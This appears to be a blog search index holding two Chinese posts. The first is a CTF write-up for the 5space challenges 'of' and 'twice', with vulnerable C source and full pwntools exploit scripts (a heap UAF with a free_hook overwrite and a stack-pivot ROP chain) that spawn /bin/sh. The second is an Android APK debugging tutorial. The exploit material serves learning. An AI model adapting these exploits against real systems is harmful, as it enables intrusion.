<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>5space (of-twice复现)</title>
    <url>/2020/07/13/2020_5space/</url>
    <content><![CDATA[<p>​        6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。<span id="more"></span></p>
<h2 id="0x00-of"><a href="#0x00-of" class="headerlink" title="0x00 . of"></a>0x00 . of</h2><p>​        题目直接给的就是一个.c的源码，看源码remote解题。源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* chunks[NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_io</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;cookie, <span class="number">8</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> res;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(SIZE);</span><br><span class="line">    <span class="keyword">if</span>(buf == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chunks[idx] = buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    *p = cookie;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line">    *p = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(chunks[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Content: &quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Content: &quot;</span>));</span><br><span class="line">    write(<span class="number">1</span>, chunks[idx], SIZE - <span class="number">8</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunks[idx], SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init_io();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Made on Ubuntu 18.04&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> choice = get_int();</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                allocate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">delete</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        看上去是个heap题，而且没有double free，但是有UAF。不过这个题目在每一个chunk中塞进了一个cookies，cookies随机生成，所以说如果要泄露起来就会很麻烦。不过看了不少write up，都说这题在部署上有点问题，remote过去不存在cookies的。所以可以正常思路直接写。</p>
<p>​        用UAF可以泄露出libc基质，改写free_hook或者malloc_hook，使其指向system，再free掉写着”/bin/sh”的堆，就相当于执行了system(“/bin/sh”)。</p>
<p>​        不过这题碰到了一个新的机制tcache。tcache是在libc2.23之后引入的，跟glibc中的各种bin类似，是一个对chunk进行申请释放操作时会用到的一个内存池。tcache是64个单向链表，每个链表最多7个节点(chunk)，chunk的大小在32bit上是12到512（8byte递增）；在64bits上是24到1024（16bytes递增）。</p>
<p>​        在这题中，申请chunk的大小统一为0x100，属于unsort bin，所以我们如果释放8个chunk，才会使第8个chunk处于unsort bin中。而此时unsort bin中仅有一个chunk，其fd和bk都指向main_arena的一定偏移处。即可leak出libc。</p>
<p>​        <a href="%5Bhttp://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/%5D(http://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/)">payload参考</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,note</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   p.sendafter(<span class="string">&quot;Content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment">#p=remote(&quot;121.36.74.70&quot;,9999)</span></span><br><span class="line">p=process(<span class="string">&quot;./of&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">   delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)-<span class="number">0x7ffff7dcfca0</span>+<span class="number">0x7ffff79e4000</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line">edit(<span class="number">6</span>,p64(libc+<span class="number">0x003ed8e8</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(libc+<span class="number">0x04f440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x01-twice"><a href="#0x01-twice" class="headerlink" title="0x01 . twice"></a>0x01 . twice</h2><p>​        本质上是个rop题。。。但是确实非常费脑子，看得头秃，有的调试还没整明白，之后再详细研究漏洞原理。</p>
<p>​        主函数如下，主要功能是遍历调用judge1，实际上只能成功调用两次。</p>
<img src="https://s1.ax1x.com/2020/07/13/UYhe8H.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYhe8H.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>​        judge1是程序的主要函数，实现了读入的功能，读入的字节数由judge2决定。而且如果ncount不为0或1，则返回值为0，这也就限定了主函数中的for循环仅进行两次。</p>
<img src="https://s1.ax1x.com/2020/07/13/UYhKKI.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYhKKI.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200713200847301" style="zoom:80%;" />

<p>​            judge2中限定了，ncount为0时返回值为89，ncount为1时返回值为112，其他情况下不允许读入。</p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYhm2d.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYhm2d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200713201139059"></p>
<p>​        程序的主要功能是允许进行两次读入，第一次读入89字节，第二次112字节，但是buf的长度是88，因此会溢出一个字节。</p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYIDdP.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYIDdP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200713205401610"></p>
<p>​        利用这个溢出，再加上read读入数据不加以补“\x00”的特性，在read的下一步进行puts时，程序会输出到下一个”\x00”为止，因此我们可以泄露出旧的rbp地址以及canary的值。</p>
<p>​        不过程序开启了NX保护，栈上代码不可执行，不能直接写shellcode。这里需要用到新知识，栈转移技术（<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#_5">frame faking</a>），制作一个假的栈帧进行rop。因为程序中没有system函数，因此我们需要用rop泄露出libc基址，再进行rop调用system(“/bin/sh”)</p>
<p>​        frame faking的大致payload格式为：</p>
<p>​        |xxxx xxxx|rop chain|padding|fake ebp|leave addr|</p>
<p>​        将返回地址覆盖为leave汇编代码的地址，这样read函数结束后先进行本身函数的leave操作，再跳转到指定地址（即leave地址）又进行一次leave操作，使得rsp和rbp指向rop chain的适当位置，得以执行我们设计的fake stack frame。</p>
<p>​        将rop chain细化可以得到如下payload：</p>
<p>​        |xxxx xxxx|arg1|arg2|…|fuction addr|ret addr|padding|fake ebp|leave addr|</p>
<p>​        为了多次进行leak，需要把上述ret addr即假栈帧的返回地址，再设置为漏洞所在函数，即可重复调用。</p>
<p>​        此处需要注意的是，rop chain中可能需要进行弹栈操作，需要利用ROPgardge查找相应的地址。</p>
<p>​        <a href="https://blog.csdn.net/baidu_36110484/article/details/107037767">payload参考</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  </span><br><span class="line">p = process(<span class="string">&#x27;./twice&#x27;</span>)</span><br><span class="line">puts_plt_addr = <span class="number">0x4005C0</span></span><br><span class="line">read_got_addr = <span class="number">0x601038</span></span><br><span class="line">pop_rdi = <span class="number">0x400923</span></span><br><span class="line">leave = <span class="number">0x400879</span></span><br><span class="line">main_addr = <span class="number">0x40087B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">88</span>+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">89</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">112</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(read_got_addr)+p64(puts_plt_addr)+p64(main_addr)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">6</span>+p64(canary)+p64(rbp)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-0xEE590s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">88</span>+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">89</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rbp2 = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">112</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp2))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc_addr+<span class="number">0x1881AC</span>)+p64(libc_addr+<span class="number">0x48880</span>)+p64(main_addr)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">6</span>+p64(canary)+p64(rbp2)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Apk 动调</title>
    <url>/2021/03/01/APK%E5%8A%A8%E8%B0%83/</url>
    <content><![CDATA[<p>Java层与Native层的动调调试。<span id="more"></span></p>
<h1 id="DDMS-java层"><a href="#DDMS-java层" class="headerlink" title="DDMS(java层)"></a>DDMS(java层)</h1><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><img src="https://z3.ax1x.com/2021/03/25/6L8TOK.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8TOK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 47%;" />

<h2 id="插桩-log输出"><a href="#插桩-log输出" class="headerlink" title="插桩-log输出"></a>插桩-log输出</h2><ol>
<li>利用AndroidKiller修改apk包，在需要插桩的代码处右键log输出，填入调试时需要输出的字符串。</li>
<li>打包安装到设备。</li>
<li>ddms中找到程序对应的activity，过滤找到输出信息。</li>
<li>根据输出信息的时间戳找到上下文，得到方法调用层次。</li>
</ol>
<h2 id="栈跟踪-stacktrace"><a href="#栈跟踪-stacktrace" class="headerlink" title="栈跟踪-stacktrace"></a>栈跟踪-stacktrace</h2><ol>
<li>利用AndroidKiller修改apk包，在需要插桩处右键stacktrace，填入调试时需要输出的字符串。</li>
<li>安装打开，用ddms过滤输出信息。</li>
<li>根据输出信息的时间戳找到上下文，自下而上得到方法调用层次。</li>
</ol>
<img src="https://z3.ax1x.com/2021/03/25/6L85S1.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L85S1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<h2 id="方法分析"><a href="#方法分析" class="headerlink" title="方法分析"></a>方法分析</h2><ol>
<li>DDMS处打开方法分析并限制分析的方法数。</li>
<li>点击ok后，立即在设备上实现需要分析的功能。</li>
<li>功能实现后立即点击停止方法分析。</li>
<li>等待方法分析窗口打开。</li>
<li>任意方法均可通过下拉项查看上层(parents)和下层(Children)的调用方法。</li>
</ol>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8IQx.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8IQx.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 43%;" /><img src="https://z3.ax1x.com/2021/03/25/6L8oy6.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8oy6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 58%;" /></p>
<h1 id="Android-Studio-Smalide-java层"><a href="#Android-Studio-Smalide-java层" class="headerlink" title="Android Studio + Smalide(java层)"></a>Android Studio + Smalide(java层)</h1><h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><ol>
<li>在AndroidKiller中打开apk文件，用AS导入该工程文件夹</li>
<li>在smali文件中设置调试断点</li>
<li>在“运行-编辑配置”中新建“remote”类型配置，设置好调试器名称和端口</li>
<li>连接设备，打开需要调试的程序，用“adb shell ps”命令找到需要调试的进程</li>
<li>用“adb forward tcp:10001 jdwp:3523”命令远程连接，其中”tcp:”后填入调试端口号，”jdwp”后填入需要调试进程的pid</li>
<li>在工具栏处选择远程调试配置，点击爬虫icon进行调试</li>
</ol>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8HeO.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8HeO.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<img src="https://z3.ax1x.com/2021/03/25/6L8bwD.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8bwD.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:47%;" />

<h1 id="IDA-Pro-Native层"><a href="#IDA-Pro-Native层" class="headerlink" title="IDA Pro(Native层)"></a>IDA Pro(Native层)</h1><h2 id="远程调试-1"><a href="#远程调试-1" class="headerlink" title="远程调试"></a>远程调试</h2><p>将android_server(64) push到设备中，chmod赋予权限并运行。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8qTe.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8qTe.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>在terminal中用adb进行端口转发。默认端口<strong>23946</strong>。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L82o4.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L82o4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>利用命令使程序挂起，此时可在设备中看见“Warnning”窗口。</p>
<blockquote>
<p>adb shell am start -D -n 包名/包名+类名</p>
</blockquote>
<img src="https://z3.ax1x.com/2021/03/25/6L8gwF.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8gwF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" />

